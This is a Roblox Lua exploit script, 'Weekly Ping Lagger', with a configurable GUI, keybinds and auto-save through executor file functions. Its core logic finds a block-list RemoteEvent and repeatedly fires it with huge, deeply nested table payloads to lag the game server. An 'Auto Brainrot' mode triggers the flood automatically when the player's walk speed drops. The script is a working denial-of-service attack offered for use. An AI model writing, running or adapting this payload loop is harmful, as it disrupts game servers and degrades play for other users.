-- Weekly Ping Lagger
-- PC + Controller keybind | Customizable | Auto-save | Auto Brainrot Detection

local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")

local plr              = Players.LocalPlayer
local plrGui           = plr:WaitForChild("PlayerGui")

-- ══════════════════════════════════════════════════════════════════════
-- CONFIG & SAVE
-- ══════════════════════════════════════════════════════════════════════
local CONFIG_FILE = "WeeklyPingLagger_Config.json"

local DEFAULT_CFG = {
    power         = 97000,
    interval      = 0.055,
    keybindKb     = "F",
    keybindGp     = "ButtonR2",
    autoBrainrot  = true,
}

local cfg = {
    power         = DEFAULT_CFG.power,
    interval      = DEFAULT_CFG.interval,
    keybindKb     = DEFAULT_CFG.keybindKb,
    keybindGp     = DEFAULT_CFG.keybindGp,
    autoBrainrot  = DEFAULT_CFG.autoBrainrot,
}

local function resolveKb(name)
    if not name or name == "" or name == "None" then return nil end
    local ok, val = pcall(function() return Enum.KeyCode[name] end)
    return (ok and val) or nil
end

local function saveConfig()
    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
    if ok and encoded and writefile then
        pcall(writefile, CONFIG_FILE, encoded)
    end
end

local function loadConfig()
    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
    if not ok or type(data) ~= "table" then return end

    cfg.power         = tonumber(data.power) or DEFAULT_CFG.power
    cfg.interval      = tonumber(data.interval) or DEFAULT_CFG.interval
    cfg.keybindKb     = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
    cfg.keybindGp     = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
    cfg.autoBrainrot  = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
end

loadConfig()

local active           = false
local listeningFor     = nil
local remote           = nil
local brainrotMode     = false
local lastBrainrotState = false
local manualOverride   = false

-- ══════════════════════════════════════════════════════════════════════
-- COLOURS (Black, White, Pink, Purple accents)
-- ══════════════════════════════════════════════════════════════════════
local C = {
    bg      = Color3.fromRGB(8,   4,  12),
    panel   = Color3.fromRGB(18,  8,  28),
    card    = Color3.fromRGB(28, 16,  40),
    pink1   = Color3.fromRGB(255, 105, 180),  -- hot pink
    pink2   = Color3.fromRGB(255, 20, 147),   -- deep pink
    pink3   = Color3.fromRGB(255, 182, 193),  -- light pink
    glow    = Color3.fromRGB(200, 50, 150),
    white   = Color3.fromRGB(255,255, 255),
    dim     = Color3.fromRGB(180,170, 200),
    green   = Color3.fromRGB(100,255, 160),
    red     = Color3.fromRGB(255,100, 120),
    waiting = Color3.fromRGB(255, 190,  50),
    inputBg = Color3.fromRGB(20, 12,  35),
}

local T = {
    bg      = 0.25,
    panel   = 0.30,
    card    = 0.28,
    header  = 0.12,
    inputBg = 0.20,
}

-- ══════════════════════════════════════════════════════════════════════
-- DESTROY OLD GUI
-- ══════════════════════════════════════════════════════════════════════
for _, kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "WeeklyPingLaggerGui" then kid:Destroy() end
end

local screen = Instance.new("ScreenGui")
screen.Name         = "WeeklyPingLaggerGui"
screen.ResetOnSpawn = false
screen.DisplayOrder = 15
screen.Parent       = plrGui

-- ══════════════════════════════════════════════════════════════════════
-- HELPERS
-- ══════════════════════════════════════════════════════════════════════
local function applyGradient(parent, c1, c2, rotation)
    local g = Instance.new("UIGradient", parent)
    g.Color    = ColorSequence.new({ ColorSequenceKeypoint.new(0,c1), ColorSequenceKeypoint.new(1,c2) })
    g.Rotation = rotation or 135
    return g
end

local function tw(obj, props, t)
    TweenService:Create(obj,
        TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        props):Play()
end

local function makeDraggable(frame)
    local dragging, dragStart, startPos
    frame.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1
        or i.UserInputType == Enum.UserInputType.Touch then
            dragging  = true
            dragStart = i.Position
            startPos  = frame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    frame.InputChanged:Connect(function(i)
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement
                      or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

local function isGamepad(kc)
    local n = kc.Name
    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
        or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
end

local BLACKLISTED = {
    [Enum.KeyCode.Escape]      = true,
    [Enum.KeyCode.LeftControl] = true,
    [Enum.KeyCode.Unknown]     = true,
}

-- ══════════════════════════════════════════════════════════════════════
-- MAIN WINDOW
-- ══════════════════════════════════════════════════════════════════════
local MAIN_W, MAIN_H = 260, 300  -- wider and taller to fit all controls

local mainFrame = Instance.new("Frame")
mainFrame.Name             = "MainFrame"
mainFrame.Size             = UDim2.new(0, MAIN_W, 0, MAIN_H)
mainFrame.Position         = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
mainFrame.BackgroundColor3 = C.bg
mainFrame.BackgroundTransparency = T.bg
mainFrame.BorderSizePixel  = 0
mainFrame.Active           = true
mainFrame.ClipsDescendants = false
mainFrame.Parent           = screen
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
applyGradient(mainFrame, C.bg, Color3.fromRGB(18,6,28), 160)

local mainStroke = Instance.new("UIStroke", mainFrame)
mainStroke.Color        = C.pink1
mainStroke.Thickness    = 1.5
mainStroke.Transparency = 0.35

makeDraggable(mainFrame)

-- Header with pink title
local header = Instance.new("Frame", mainFrame)
header.Size             = UDim2.new(1,0,0,32)
header.BackgroundColor3 = C.pink1
header.BackgroundTransparency = T.header
header.BorderSizePixel  = 0
header.ZIndex           = 2
Instance.new("UICorner", header).CornerRadius = UDim.new(0,12)
applyGradient(header, C.pink1, C.pink2, 135)

local headerFill = Instance.new("Frame", mainFrame)
headerFill.Size             = UDim2.new(1,0,0,8)
headerFill.Position         = UDim2.new(0,0,0,24)
headerFill.BackgroundColor3 = C.pink1
headerFill.BackgroundTransparency = T.header
headerFill.BorderSizePixel  = 0
headerFill.ZIndex           = 2
applyGradient(headerFill, C.pink1, C.pink2, 135)

local titleLbl = Instance.new("TextLabel", header)
titleLbl.Size               = UDim2.new(1,-90,1,0)
titleLbl.Position           = UDim2.new(0,8,0,0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text               = "WEEKLY PING LAGGER"
titleLbl.TextColor3         = C.white
titleLbl.Font               = Enum.Font.GothamBlack
titleLbl.TextSize           = 9
titleLbl.TextXAlignment     = Enum.TextXAlignment.Left
titleLbl.ZIndex             = 3

-- Status pill (ON/OFF)
local statusPill = Instance.new("Frame", header)
statusPill.Size             = UDim2.new(0,40,0,16)
statusPill.Position         = UDim2.new(1,-48,0.5,-8)
statusPill.BackgroundColor3 = Color3.fromRGB(40,10,60)
statusPill.BackgroundTransparency = 0.15
statusPill.BorderSizePixel  = 0
statusPill.ZIndex           = 3
Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1,0)

local statusLbl = Instance.new("TextLabel", statusPill)
statusLbl.Size              = UDim2.new(1,0,1,0)
statusLbl.BackgroundTransparency = 1
statusLbl.Text              = "OFF"
statusLbl.TextColor3        = C.red
statusLbl.Font              = Enum.Font.GothamBlack
statusLbl.TextSize          = 8
statusLbl.ZIndex            = 4

-- Activate button
local activateBtn = Instance.new("TextButton", mainFrame)
activateBtn.Size             = UDim2.new(1,-16,0,28)
activateBtn.Position         = UDim2.new(0,8,0,38)
activateBtn.BackgroundColor3 = C.card
activateBtn.BackgroundTransparency = T.card
activateBtn.BorderSizePixel  = 0
activateBtn.AutoButtonColor  = false
activateBtn.Text             = ""
activateBtn.ZIndex           = 3
Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0,8)
local activateGrad = applyGradient(activateBtn, C.pink1, C.pink2, 135)

local activateStroke = Instance.new("UIStroke", activateBtn)
activateStroke.Color        = C.pink3
activateStroke.Thickness    = 1.2
activateStroke.Transparency = 0.4

local activateLbl = Instance.new("TextLabel", activateBtn)
activateLbl.Size            = UDim2.new(1,0,1,0)
activateLbl.BackgroundTransparency = 1
activateLbl.Text            = "ACTIVATE LAG"
activateLbl.TextColor3      = C.white
activateLbl.Font            = Enum.Font.GothamBlack
activateLbl.TextSize        = 11
activateLbl.ZIndex          = 5

-- ── Helper: Input row with +/- buttons ─────────────────────────────
local function mkInputRowWithButtons(yPos, labelText, getValue, onConfirm, step, minVal)
    local row = Instance.new("Frame", mainFrame)
    row.Size             = UDim2.new(1,-16,0,32)
    row.Position         = UDim2.new(0,8,0,yPos)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = T.card
    row.BorderSizePixel  = 0
    row.ZIndex           = 3
    Instance.new("UICorner", row).CornerRadius = UDim.new(0,6)
    local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1; rs.Transparency=0.6

    local lbl = Instance.new("TextLabel", row)
    lbl.Size               = UDim2.new(0.35,0,1,0)
    lbl.Position           = UDim2.new(0,4,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text               = labelText
    lbl.TextColor3         = C.white
    lbl.Font               = Enum.Font.GothamBold
    lbl.TextSize           = 10
    lbl.TextXAlignment     = Enum.TextXAlignment.Left
    lbl.ZIndex             = 4

    local box = Instance.new("TextBox", row)
    box.Size               = UDim2.new(0,60,0,22)
    box.Position           = UDim2.new(0.35,0,0.5,-11)
    box.BackgroundColor3   = C.inputBg
    box.BackgroundTransparency = T.inputBg
    box.BorderSizePixel    = 0
    box.Text               = tostring(getValue())
    box.TextColor3         = C.pink3
    box.Font               = Enum.Font.GothamBold
    box.TextSize           = 11
    box.ClearTextOnFocus   = false
    box.ZIndex             = 5
    Instance.new("UICorner", box).CornerRadius = UDim.new(0,6)
    local bs = Instance.new("UIStroke",box); bs.Color=C.glow; bs.Thickness=1; bs.Transparency=0.5

    box.Focused:Connect(function()   tw(bs,{Color=C.pink2,Transparency=0},0.12) end)
    box.FocusLost:Connect(function()
        tw(bs,{Color=C.glow,Transparency=0.5},0.12)
        local n = tonumber(box.Text)
        if n then
            onConfirm(n)
            box.Text = tostring(getValue())
            saveConfig()
        else
            box.Text = tostring(getValue())
        end
    end)

    -- Minus button
    local minusBtn = Instance.new("TextButton", row)
    minusBtn.Size             = UDim2.new(0,22,0,22)
    minusBtn.Position         = UDim2.new(0.35 + 60/MAIN_W + 0.02, 0, 0.5, -11)
    minusBtn.BackgroundColor3 = C.inputBg
    minusBtn.BackgroundTransparency = 0.2
    minusBtn.BorderSizePixel  = 0
    minusBtn.AutoButtonColor  = false
    minusBtn.Text             = "−"
    minusBtn.TextColor3       = C.white
    minusBtn.Font             = Enum.Font.GothamBold
    minusBtn.TextSize         = 14
    minusBtn.ZIndex           = 5
    Instance.new("UICorner", minusBtn).CornerRadius = UDim.new(1,0)
    local mStr = Instance.new("UIStroke", minusBtn); mStr.Color=C.glow; mStr.Thickness=1; mStr.Transparency=0.5
    minusBtn.MouseEnter:Connect(function() tw(mStr,{Color=C.pink2,Transparency=0},0.1) end)
    minusBtn.MouseLeave:Connect(function() tw(mStr,{Color=C.glow,Transparency=0.5},0.1) end)
    minusBtn.MouseButton1Click:Connect(function()
        local val = getValue() - step
        if minVal then val = math.max(minVal, val) end
        onConfirm(val)
        box.Text = tostring(getValue())
        saveConfig()
    end)

    -- Plus button
    local plusBtn = Instance.new("TextButton", row)
    plusBtn.Size             = UDim2.new(0,22,0,22)
    plusBtn.Position         = UDim2.new(0.35 + 60/MAIN_W + 0.02 + 22/MAIN_W + 0.01, 0, 0.5, -11)
    plusBtn.BackgroundColor3 = C.inputBg
    plusBtn.BackgroundTransparency = 0.2
    plusBtn.BorderSizePixel  = 0
    plusBtn.AutoButtonColor  = false
    plusBtn.Text             = "+"
    plusBtn.TextColor3       = C.white
    plusBtn.Font             = Enum.Font.GothamBold
    plusBtn.TextSize         = 14
    plusBtn.ZIndex           = 5
    Instance.new("UICorner", plusBtn).CornerRadius = UDim.new(1,0)
    local pStr = Instance.new("UIStroke", plusBtn); pStr.Color=C.glow; pStr.Thickness=1; pStr.Transparency=0.5
    plusBtn.MouseEnter:Connect(function() tw(pStr,{Color=C.pink2,Transparency=0},0.1) end)
    plusBtn.MouseLeave:Connect(function() tw(pStr,{Color=C.glow,Transparency=0.5},0.1) end)
    plusBtn.MouseButton1Click:Connect(function()
        local val = getValue() + step
        onConfirm(val)
        box.Text = tostring(getValue())
        saveConfig()
    end)

    return box
end

-- Power row (step 1000, min 1)
local powerBox = mkInputRowWithButtons(72, "Power", 
    function() return cfg.power end,
    function(v) cfg.power = math.max(1, v) end,
    1000, 1)

-- Delay row (step 0.005, min 0.01)
local intervalBox = mkInputRowWithButtons(106, "Delay (secs)", 
    function() return cfg.interval end,
    function(v) cfg.interval = math.max(0.01, v) end,
    0.005, 0.01)

-- ── Auto Brainrot toggle ────────────────────────────────────────────
local brainrotRowY = 140
local brainrotRow = Instance.new("Frame", mainFrame)
brainrotRow.Size             = UDim2.new(1,-16,0,34)
brainrotRow.Position         = UDim2.new(0,8,0,brainrotRowY)
brainrotRow.BackgroundColor3 = C.card
brainrotRow.BackgroundTransparency = T.card
brainrotRow.BorderSizePixel  = 0
brainrotRow.ZIndex           = 3
Instance.new("UICorner", brainrotRow).CornerRadius = UDim.new(0,8)
local brs = Instance.new("UIStroke",brainrotRow); brs.Color=C.glow; brs.Thickness=1; brs.Transparency=0.6

local brainrotLbl = Instance.new("TextLabel", brainrotRow)
brainrotLbl.Size               = UDim2.new(0.6,0,1,0)
brainrotLbl.Position           = UDim2.new(0,8,0,0)
brainrotLbl.BackgroundTransparency = 1
brainrotLbl.Text               = "Auto Brainrot"
brainrotLbl.TextColor3         = C.white
brainrotLbl.Font               = Enum.Font.GothamBold
brainrotLbl.TextSize           = 10
brainrotLbl.TextXAlignment     = Enum.TextXAlignment.Left
brainrotLbl.ZIndex             = 4

local brainrotToggle = Instance.new("TextButton", brainrotRow)
brainrotToggle.Size             = UDim2.new(0,50,0,24)
brainrotToggle.Position         = UDim2.new(1,-58,0.5,-12)
brainrotToggle.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)
brainrotToggle.BorderSizePixel  = 0
brainrotToggle.AutoButtonColor  = false
brainrotToggle.Text             = cfg.autoBrainrot and "ON" or "OFF"
brainrotToggle.TextColor3       = C.white
brainrotToggle.Font             = Enum.Font.GothamBlack
brainrotToggle.TextSize         = 9
brainrotToggle.ZIndex           = 5
Instance.new("UICorner", brainrotToggle).CornerRadius = UDim.new(1,0)
local btStr = Instance.new("UIStroke", brainrotToggle); btStr.Color=C.glow; btStr.Thickness=1; btStr.Transparency=0.5

brainrotToggle.MouseButton1Click:Connect(function()
    cfg.autoBrainrot = not cfg.autoBrainrot
    brainrotToggle.Text = cfg.autoBrainrot and "ON" or "OFF"
    tw(brainrotToggle, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)}, 0.15)
    saveConfig()
end)

-- ── Keybind rows ────────────────────────────────────────────────────
local keyY = brainrotRowY + 34 + 6  -- gap

-- Keyboard keybind row
local kbRow = Instance.new("Frame", mainFrame)
kbRow.Size             = UDim2.new(1,-16,0,34)
kbRow.Position         = UDim2.new(0,8,0,keyY)
kbRow.BackgroundColor3 = C.card
kbRow.BackgroundTransparency = T.card
kbRow.BorderSizePixel  = 0
kbRow.ZIndex           = 3
Instance.new("UICorner", kbRow).CornerRadius = UDim.new(0,8)
local krs = Instance.new("UIStroke",kbRow); krs.Color=C.glow; krs.Thickness=1; krs.Transparency=0.6

local kbLbl = Instance.new("TextLabel", kbRow)
kbLbl.Size               = UDim2.new(0.4,0,1,0)
kbLbl.Position           = UDim2.new(0,8,0,0)
kbLbl.BackgroundTransparency = 1
kbLbl.Text               = "Keyboard"
kbLbl.TextColor3         = C.white
kbLbl.Font               = Enum.Font.GothamBold
kbLbl.TextSize           = 10
kbLbl.TextXAlignment     = Enum.TextXAlignment.Left
kbLbl.ZIndex             = 4

local kbBindBtn = Instance.new("TextButton", kbRow)
kbBindBtn.Size             = UDim2.new(0,72,0,24)
kbBindBtn.Position         = UDim2.new(1,-100,0.5,-12)
kbBindBtn.BackgroundColor3 = C.inputBg
kbBindBtn.BackgroundTransparency = T.inputBg
kbBindBtn.BorderSizePixel  = 0
kbBindBtn.AutoButtonColor  = false
kbBindBtn.Font             = Enum.Font.GothamBold
kbBindBtn.TextSize         = 9
kbBindBtn.TextColor3       = C.pink3
kbBindBtn.ZIndex           = 5
kbBindBtn.Text             = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
Instance.new("UICorner", kbBindBtn).CornerRadius = UDim.new(0,6)
local kbStr = Instance.new("UIStroke",kbBindBtn); kbStr.Color=C.glow; kbStr.Thickness=1; kbStr.Transparency=0.5
kbBindBtn.MouseEnter:Connect(function() tw(kbStr,{Color=C.pink2,Transparency=0},0.1) end)
kbBindBtn.MouseLeave:Connect(function() tw(kbStr,{Color=C.glow,Transparency=0.5},0.1) end)

kbBindBtn.MouseButton1Click:Connect(function()
    listeningFor = (listeningFor == "kb") and nil or "kb"
    updateKbLabels()
end)

local kbClearBtn = Instance.new("TextButton", kbRow)
kbClearBtn.Size             = UDim2.new(0,24,0,24)
kbClearBtn.Position         = UDim2.new(1,-28,0.5,-12)
kbClearBtn.BackgroundColor3 = Color3.fromRGB(50,15,30)
kbClearBtn.BackgroundTransparency = T.inputBg
kbClearBtn.BorderSizePixel  = 0
kbClearBtn.AutoButtonColor  = false
kbClearBtn.Text             = "X"
kbClearBtn.TextColor3       = C.red
kbClearBtn.Font             = Enum.Font.GothamBlack
kbClearBtn.TextSize         = 10
kbClearBtn.ZIndex           = 5
Instance.new("UICorner", kbClearBtn).CornerRadius = UDim.new(0,6)
local kcStr = Instance.new("UIStroke",kbClearBtn); kcStr.Color=C.red; kcStr.Thickness=1; kcStr.Transparency=0.5
kbClearBtn.MouseEnter:Connect(function() tw(kcStr,{Transparency=0},0.1) end)
kbClearBtn.MouseLeave:Connect(function() tw(kcStr,{Transparency=0.5},0.1) end)
kbClearBtn.MouseButton1Click:Connect(function()
    if listeningFor == "kb" then listeningFor = nil end
    cfg.keybindKb = "None"
    updateKbLabels()
    saveConfig()
end)

-- Controller keybind row
local gpY = keyY + 34 + 6
local gpRow = Instance.new("Frame", mainFrame)
gpRow.Size             = UDim2.new(1,-16,0,34)
gpRow.Position         = UDim2.new(0,8,0,gpY)
gpRow.BackgroundColor3 = C.card
gpRow.BackgroundTransparency = T.card
gpRow.BorderSizePixel  = 0
gpRow.ZIndex           = 3
Instance.new("UICorner", gpRow).CornerRadius = UDim.new(0,8)
local grs = Instance.new("UIStroke",gpRow); grs.Color=C.glow; grs.Thickness=1; grs.Transparency=0.6

local gpLbl = Instance.new("TextLabel", gpRow)
gpLbl.Size               = UDim2.new(0.4,0,1,0)
gpLbl.Position           = UDim2.new(0,8,0,0)
gpLbl.BackgroundTransparency = 1
gpLbl.Text               = "Controller"
gpLbl.TextColor3         = C.white
gpLbl.Font               = Enum.Font.GothamBold
gpLbl.TextSize           = 10
gpLbl.TextXAlignment     = Enum.TextXAlignment.Left
gpLbl.ZIndex             = 4

local gpBindBtn = Instance.new("TextButton", gpRow)
gpBindBtn.Size             = UDim2.new(0,72,0,24)
gpBindBtn.Position         = UDim2.new(1,-100,0.5,-12)
gpBindBtn.BackgroundColor3 = C.inputBg
gpBindBtn.BackgroundTransparency = T.inputBg
gpBindBtn.BorderSizePixel  = 0
gpBindBtn.AutoButtonColor  = false
gpBindBtn.Font             = Enum.Font.GothamBold
gpBindBtn.TextSize         = 9
gpBindBtn.TextColor3       = C.pink3
gpBindBtn.ZIndex           = 5
gpBindBtn.Text             = cfg.keybindGp ~= "" and cfg.keybindGp or "None"
Instance.new("UICorner", gpBindBtn).CornerRadius = UDim.new(0,6)
local gpStr = Instance.new("UIStroke",gpBindBtn); gpStr.Color=C.glow; gpStr.Thickness=1; gpStr.Transparency=0.5
gpBindBtn.MouseEnter:Connect(function() tw(gpStr,{Color=C.pink2,Transparency=0},0.1) end)
gpBindBtn.MouseLeave:Connect(function() tw(gpStr,{Color=C.glow,Transparency=0.5},0.1) end)

gpBindBtn.MouseButton1Click:Connect(function()
    listeningFor = (listeningFor == "gp") and nil or "gp"
    updateKbLabels()
end)

local gpClearBtn = Instance.new("TextButton", gpRow)
gpClearBtn.Size             = UDim2.new(0,24,0,24)
gpClearBtn.Position         = UDim2.new(1,-28,0.5,-12)
gpClearBtn.BackgroundColor3 = Color3.fromRGB(50,15,30)
gpClearBtn.BackgroundTransparency = T.inputBg
gpClearBtn.BorderSizePixel  = 0
gpClearBtn.AutoButtonColor  = false
gpClearBtn.Text             = "X"
gpClearBtn.TextColor3       = C.red
gpClearBtn.Font             = Enum.Font.GothamBlack
gpClearBtn.TextSize         = 10
gpClearBtn.ZIndex           = 5
Instance.new("UICorner", gpClearBtn).CornerRadius = UDim.new(0,6)
local gcStr = Instance.new("UIStroke",gpClearBtn); gcStr.Color=C.red; gcStr.Thickness=1; gcStr.Transparency=0.5
gpClearBtn.MouseEnter:Connect(function() tw(gcStr,{Transparency=0},0.1) end)
gpClearBtn.MouseLeave:Connect(function() tw(gcStr,{Transparency=0.5},0.1) end)
gpClearBtn.MouseButton1Click:Connect(function()
    if listeningFor == "gp" then listeningFor = nil end
    cfg.keybindGp = "None"
    updateKbLabels()
    saveConfig()
end)

-- Reset button (optional, but kept as a small button at bottom)
local resetY = gpY + 34 + 6
local resetBtn = Instance.new("TextButton", mainFrame)
resetBtn.Size             = UDim2.new(1,-16,0,24)
resetBtn.Position         = UDim2.new(0,8,0,resetY)
resetBtn.BackgroundColor3 = C.glow
resetBtn.BorderSizePixel  = 0
resetBtn.AutoButtonColor  = false
resetBtn.Text             = "Reset Defaults"
resetBtn.TextColor3       = C.white
resetBtn.Font             = Enum.Font.GothamBold
resetBtn.TextSize         = 9
resetBtn.ZIndex           = 3
Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0,6)
applyGradient(resetBtn, C.glow, C.pink1, 135)
resetBtn.MouseEnter:Connect(function() tw(resetBtn,{BackgroundColor3=C.pink1},0.1) end)
resetBtn.MouseLeave:Connect(function() tw(resetBtn,{BackgroundColor3=C.glow},0.1) end)

resetBtn.MouseButton1Click:Connect(function()
    -- simple reset without confirmation
    cfg.power     = DEFAULT_CFG.power
    cfg.interval  = DEFAULT_CFG.interval
    cfg.keybindKb = DEFAULT_CFG.keybindKb
    cfg.keybindGp = DEFAULT_CFG.keybindGp
    cfg.autoBrainrot = DEFAULT_CFG.autoBrainrot
    powerBox.Text    = tostring(cfg.power)
    intervalBox.Text = tostring(cfg.interval)
    brainrotToggle.Text = cfg.autoBrainrot and "ON" or "OFF"
    tw(brainrotToggle, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)}, 0.15)
    updateKbLabels()
    saveConfig()
end)

-- ── Keybind label update function ──────────────────────────────────
local function updateKbLabels()
    if kbBindBtn then
        if listeningFor == "kb" then
            kbBindBtn.Text      = "Press a key..."
            kbBindBtn.TextColor3 = C.waiting
        else
            kbBindBtn.Text      = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
            kbBindBtn.TextColor3 = C.pink3
        end
    end
    if gpBindBtn then
        if listeningFor == "gp" then
            gpBindBtn.Text      = "Press a button..."
            gpBindBtn.TextColor3 = C.waiting
        else
            gpBindBtn.Text      = cfg.keybindGp ~= "" and cfg.keybindGp or "None"
            gpBindBtn.TextColor3 = C.pink3
        end
    end
end

-- Adjust main window height to fit all rows (we set MAIN_H = 300, but calculate actual)
-- We set MAIN_H manually above to 300, which should be enough.

-- ══════════════════════════════════════════════════════════════════════
-- PING LAGGER LOGIC (unchanged)
-- ══════════════════════════════════════════════════════════════════════

local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local remote
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then remote = r break end
    end
    if not remote then
        for _, c in ipairs(rrs:GetChildren()) do
            if c:IsA("RemoteEvent") and c.Name:find("Block") then remote = c break end
        end
    end
    return remote
end

remote = findRemote()

local function buildPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / 188), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local function runPingLoop()
    local delay = cfg.interval
    while active and remote do
        local payload = buildPayload(cfg.power)
        local ok = pcall(function() remote:FireServer(payload) end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.05)
        end
        task.wait(delay)
    end
end

local function flipLag(state, isManual)
    active = state

    if isManual then
        if brainrotMode then
            manualOverride = not state
        else
            manualOverride = false
        end
    end

    if active then
        if not remote then
            remote = findRemote()
            if not remote then
                active = false
                flipLag(false)
                return
            end
        end
        activateGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0,C.pink2),
            ColorSequenceKeypoint.new(1,C.pink3),
        })
        activateLbl.Text            = "ACTIVATED"
        activateStroke.Color        = C.white
        activateStroke.Transparency = 0
        statusLbl.Text              = "ON"
        statusLbl.TextColor3        = C.green
        tw(statusPill, {BackgroundColor3=Color3.fromRGB(10,40,20)}, 0.2)
        mainStroke.Color            = C.green
        mainStroke.Transparency     = 0.1
        task.spawn(runPingLoop)
    else
        activateGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0,C.pink1),
            ColorSequenceKeypoint.new(1,C.pink2),
        })
        activateLbl.Text            = "ACTIVATE LAG"
        activateStroke.Color        = C.pink3
        activateStroke.Transparency = 0.4
        statusLbl.Text              = "OFF"
        statusLbl.TextColor3        = C.red
        tw(statusPill, {BackgroundColor3=Color3.fromRGB(40,10,60)}, 0.2)
        mainStroke.Color            = C.pink1
        mainStroke.Transparency     = 0.35
    end
end

activateBtn.MouseButton1Click:Connect(function()
    flipLag(not active, true)
end)
activateBtn.MouseEnter:Connect(function()
    if not active then tw(activateBtn,{BackgroundColor3=Color3.fromRGB(180,50,130)},0.1) end
end)
activateBtn.MouseLeave:Connect(function()
    if not active then tw(activateBtn,{BackgroundColor3=C.card},0.1) end
end)

-- ══════════════════════════════════════════════════════════════════════
-- AUTO BRAINROT DETECTION (unchanged)
-- ══════════════════════════════════════════════════════════════════════
RunService.Heartbeat:Connect(function()
    if not cfg.autoBrainrot then
        if brainrotMode then
            brainrotMode = false
            lastBrainrotState = false
        end
        return
    end

    local char = plr.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end

    local hasBrainrot = hum.WalkSpeed < 25

    if hasBrainrot and not lastBrainrotState then
        brainrotMode = true
        lastBrainrotState = true
        manualOverride = false
        flipLag(true)
    elseif not hasBrainrot and lastBrainrotState then
        brainrotMode = false
        lastBrainrotState = false
        manualOverride = false
        flipLag(false)
    end
end)

-- ══════════════════════════════════════════════════════════════════════
-- INPUT HANDLER (unchanged)
-- ══════════════════════════════════════════════════════════════════════
UserInputService.InputBegan:Connect(function(input, processed)
    local kc  = input.KeyCode
    if kc == Enum.KeyCode.Unknown then return end

    local isGp = isGamepad(kc)
    local isKb = input.UserInputType == Enum.UserInputType.Keyboard

    if listeningFor then
        if kc == Enum.KeyCode.Escape then
            listeningFor = nil
            updateKbLabels()
            return
        end
        if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
            cfg.keybindKb = kc.Name
            listeningFor  = nil
            updateKbLabels()
            saveConfig()
            return
        end
        if listeningFor == "gp" and isGp then
            cfg.keybindGp = kc.Name
            listeningFor  = nil
            updateKbLabels()
            saveConfig()
            return
        end
        return
    end

    if processed then return end

    if kc == Enum.KeyCode.LeftControl then
        mainFrame.Visible = not mainFrame.Visible
        return
    end

    local kbEnum = resolveKb(cfg.keybindKb)
    local gpEnum = resolveKb(cfg.keybindGp)

    if (kbEnum and kc == kbEnum and isKb)
    or (gpEnum and kc == gpEnum and isGp) then
        flipLag(not active, true)
    end
end)

updateKbLabels()